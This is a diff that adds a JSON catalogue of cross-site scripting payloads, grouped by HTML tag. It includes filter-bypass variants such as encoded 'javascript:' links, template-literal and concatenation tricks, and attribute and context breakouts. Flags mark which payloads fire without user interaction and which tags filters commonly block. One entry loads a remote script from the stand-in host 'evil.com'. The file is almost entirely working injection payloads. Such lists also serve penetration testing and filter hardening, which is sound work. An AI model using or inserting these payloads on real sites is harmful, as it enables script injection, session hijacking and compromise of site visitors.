@@ -1,0 +1,160 @@
+{
+  "tags": {
+    "script": [
+      {"tag": "script", "payload": "<script>alert(1)</script>", "auto_trigger": true, "blocked_common": true},
+      {"tag": "script", "payload": "<script src=//evil.com/x.js>", "auto_trigger": true, "blocked_common": true},
+      {"tag": "script", "payload": "<script>alert`1`</script>", "auto_trigger": true, "note": "Template literal bypass"},
+      {"tag": "script", "payload": "<script>\\u0061lert(1)</script>", "auto_trigger": true, "note": "Unicode escape"},
+      {"tag": "script", "payload": "<script>eval('al'+'ert(1)')</script>", "auto_trigger": true, "note": "String concat"}
+    ],
+    "img": [
+      {"tag": "img", "payload": "<img src=x onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "img", "payload": "<img src=x onerror=alert`1`>", "auto_trigger": true, "note": "Template literal"},
+      {"tag": "img", "payload": "<img/src=x onerror=alert(1)>", "auto_trigger": true, "note": "No space"},
+      {"tag": "img", "payload": "<img src=x:x onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "img", "payload": "<img src onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "img", "payload": "<img src=1 href=1 onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "img", "payload": "<img srcset=x onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "img", "payload": "<img src/onerror=alert(1)>", "auto_trigger": true, "note": "Slash separator"}
+    ],
+    "svg": [
+      {"tag": "svg", "payload": "<svg onload=alert(1)>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg/onload=alert(1)>", "auto_trigger": true, "note": "No space"},
+      {"tag": "svg", "payload": "<svg onload=alert`1`>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><script>alert(1)</script>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><animate onend=alert(1) attributeName=x dur=1s>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><set onbegin=alert(1) attributename=x to=y>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><animateTransform onbegin=alert(1)>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><animatemotion onbegin=alert(1)>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><discard onbegin=alert(1)>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><foreignObject><iframe onload=alert(1)></foreignObject>", "auto_trigger": true},
+      {"tag": "svg", "payload": "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=1000 height=1000/></a>", "auto_trigger": false}
+    ],
+    "body": [
+      {"tag": "body", "payload": "<body onload=alert(1)>", "auto_trigger": true},
+      {"tag": "body", "payload": "<body onpageshow=alert(1)>", "auto_trigger": true},
+      {"tag": "body", "payload": "<body onhashchange=alert(1)>", "auto_trigger": true},
+      {"tag": "body", "payload": "<body onpopstate=alert(1)>", "auto_trigger": true},
+      {"tag": "body", "payload": "<body onmessage=alert(1)>", "auto_trigger": true},
+      {"tag": "body", "payload": "<body onscroll=alert(1)><div style=height:1000px></div>", "auto_trigger": true},
+      {"tag": "body", "payload": "<body onresize=alert(1)>", "auto_trigger": false},
+      {"tag": "body", "payload": "<body onfocus=alert(1)>", "auto_trigger": false},
+      {"tag": "body", "payload": "<body onbeforeprint=alert(1)>", "auto_trigger": false},
+      {"tag": "body", "payload": "<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>", "auto_trigger": true, "browsers": ["firefox"]}
+    ],
+    "iframe": [
+      {"tag": "iframe", "payload": "<iframe src=javascript:alert(1)>", "auto_trigger": true},
+      {"tag": "iframe", "payload": "<iframe onload=alert(1)>", "auto_trigger": true},
+      {"tag": "iframe", "payload": "<iframe srcdoc='<script>alert(1)</script>'>", "auto_trigger": true},
+      {"tag": "iframe", "payload": "<iframe src=data:text/html,<script>alert(1)</script>>", "auto_trigger": true},
+      {"tag": "iframe", "payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "auto_trigger": true}
+    ],
+    "input": [
+      {"tag": "input", "payload": "<input onfocus=alert(1) autofocus>", "auto_trigger": true},
+      {"tag": "input", "payload": "<input onblur=alert(1) autofocus><input autofocus>", "auto_trigger": true},
+      {"tag": "input", "payload": "<input type=image src=x onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "input", "payload": "<input onfocus=alert(1) autofocus/>", "auto_trigger": true},
+      {"tag": "input", "payload": "<input type=hidden oncontentvisibilityautostatechange=alert(1)>", "auto_trigger": true}
+    ],
+    "details": [
+      {"tag": "details", "payload": "<details open ontoggle=alert(1)>", "auto_trigger": true},
+      {"tag": "details", "payload": "<details/open/ontoggle=alert(1)>", "auto_trigger": true, "note": "No spaces"}
+    ],
+    "select": [
+      {"tag": "select", "payload": "<select onfocus=alert(1) autofocus>", "auto_trigger": true},
+      {"tag": "select", "payload": "<select onchange=alert(1)><option>1</option><option>2</option></select>", "auto_trigger": false}
+    ],
+    "textarea": [
+      {"tag": "textarea", "payload": "<textarea onfocus=alert(1) autofocus>", "auto_trigger": true},
+      {"tag": "textarea", "payload": "<textarea autofocus onfocus=alert(1)>", "auto_trigger": true}
+    ],
+    "audio": [
+      {"tag": "audio", "payload": "<audio src=x onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "audio", "payload": "<audio><source onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "audio", "payload": "<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>", "auto_trigger": true},
+      {"tag": "audio", "payload": "<audio onloadeddata=alert(1)><source src=\"validaudio.wav\"></audio>", "auto_trigger": true},
+      {"tag": "audio", "payload": "<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\"></audio>", "auto_trigger": true}
+    ],
+    "video": [
+      {"tag": "video", "payload": "<video src=x onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "video", "payload": "<video><source onerror=alert(1)>", "auto_trigger": true},
+      {"tag": "video", "payload": "<video onloadstart=\"alert(1)\"><source></video>", "auto_trigger": true},
+      {"tag": "video", "payload": "<video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\"></video>", "auto_trigger": true}
+    ],
+    "object_embed": [
+      {"tag": "object", "payload": "<object data=javascript:alert(1)>", "auto_trigger": true},
+      {"tag": "embed", "payload": "<embed src=javascript:alert(1)>", "auto_trigger": true},
+      {"tag": "object", "payload": "<object type=text/html data=data:text/html,<script>alert(1)</script>>", "auto_trigger": true}
+    ],
+    "marquee": [
+      {"tag": "marquee", "payload": "<marquee onstart=alert(1)>", "auto_trigger": true},
+      {"tag": "marquee", "payload": "<marquee onfinish=alert(1) loop=1>x</marquee>", "auto_trigger": true},
+      {"tag": "marquee", "payload": "<marquee onbounce=alert(1)>x</marquee>", "auto_trigger": false}
+    ],
+    "math": [
+      {"tag": "math", "payload": "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>CLICKME</maction></math>", "auto_trigger": false},
+      {"tag": "math", "payload": "<math href=javascript:alert(1)>CLICK</math>", "auto_trigger": false}
+    ],
+    "link_a": [
+      {"tag": "a", "payload": "<a href=javascript:alert(1)>click</a>", "auto_trigger": false},
+      {"tag": "a", "payload": "<a href=javascript:alert`1`>click</a>", "auto_trigger": false},
+      {"tag": "a", "payload": "<a href=javascript&colon;alert(1)>click</a>", "auto_trigger": false, "note": "HTML entity"},
+      {"tag": "a", "payload": "<a href=&#x6A;avascript:alert(1)>click</a>", "auto_trigger": false, "note": "Hex entity"},
+      {"tag": "a", "payload": "<a href=\"javascript:void(0)\" onclick=alert(1)>click</a>", "auto_trigger": false}
+    ],
+    "form": [
+      {"tag": "form", "payload": "<form action=javascript:alert(1)><input type=submit>", "auto_trigger": false},
+      {"tag": "form", "payload": "<form><button formaction=javascript:alert(1)>X</button></form>", "auto_trigger": false},
+      {"tag": "form", "payload": "<form><input type=submit formaction=javascript:alert(1)>", "auto_trigger": false}
+    ],
+    "keygen": [
+      {"tag": "keygen", "payload": "<keygen onfocus=alert(1) autofocus>", "auto_trigger": true}
+    ],
+    "base": [
+      {"tag": "base", "payload": "<base href=javascript:/a/-alert(1)///////>", "auto_trigger": false}
+    ],
+    "style_css": [
+      {"tag": "style", "payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>", "auto_trigger": true},
+      {"tag": "style", "payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>", "auto_trigger": true}
+    ],
+    "track": [
+      {"tag": "track", "payload": "<track default oncuechange=alert(1) src=\"data:text/vtt,WEBVTT%0A%0A00:00.000 --> 00:01.000%0ATest\">", "auto_trigger": true, "browsers": ["chrome"]}
+    ],
+    "dialog": [
+      {"tag": "dialog", "payload": "<dialog open onclose=alert(1)><button>XSS</button></dialog>", "auto_trigger": false}
+    ],
+    "custom_tags": [
+      {"tag": "xss", "payload": "<xss onfocus=alert(1) autofocus tabindex=1>", "auto_trigger": true},
+      {"tag": "xss", "payload": "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>", "auto_trigger": true},
+      {"tag": "xss", "payload": "<xss onsecuritypolicyviolation=alert(1)>XSS</xss>", "auto_trigger": true},
+      {"tag": "xss", "payload": "<xss id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></xss>", "auto_trigger": true},
+      {"tag": "xss", "payload": "<xss onscrollend=alert(1) style=\"overflow:auto;height:100px\"><br><br><br></xss>", "auto_trigger": true}
+    ],
+    "popover": [
+      {"tag": "button", "payload": "<button popovertarget=x>Click</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>", "auto_trigger": false},
+      {"tag": "button", "payload": "<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>", "auto_trigger": false, "browsers": ["chrome"]}
+    ],
+    "xss_polyglot": [
+      {"tag": "polyglot", "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", "auto_trigger": false, "note": "Polyglot"},
+      {"tag": "polyglot", "payload": "\"><img src=x onerror=alert(1)>", "auto_trigger": true, "note": "Attribute breakout"},
+      {"tag": "polyglot", "payload": "'><img src=x onerror=alert(1)>", "auto_trigger": true, "note": "Single quote breakout"},
+      {"tag": "polyglot", "payload": "</script><script>alert(1)</script>", "auto_trigger": true, "note": "Script breakout"},
+      {"tag": "polyglot", "payload": "</title><script>alert(1)</script>", "auto_trigger": true, "note": "Title breakout"},
+      {"tag": "polyglot", "payload": "</style><script>alert(1)</script>", "auto_trigger": true, "note": "Style breakout"},
+      {"tag": "polyglot", "payload": "</textarea><script>alert(1)</script>", "auto_trigger": true, "note": "Textarea breakout"},
+      {"tag": "polyglot", "payload": "'\"--></style></script><svg/onload=alert(1)>", "auto_trigger": true, "note": "Multi-context breakout"}
+    ]
+  },
+  "no_interaction_required": [
+    "img", "svg", "body", "iframe", "details", "input", "video", "audio", "marquee", "keygen",
+    "select", "textarea", "track", "style", "custom_tags"
+  ],
+  "commonly_blocked": [
+    "script", "iframe", "object", "embed"
+  ],
+  "svg_animation_tags": [
+    "animate", "animatemotion", "animatetransform", "set"
+  ]
+}
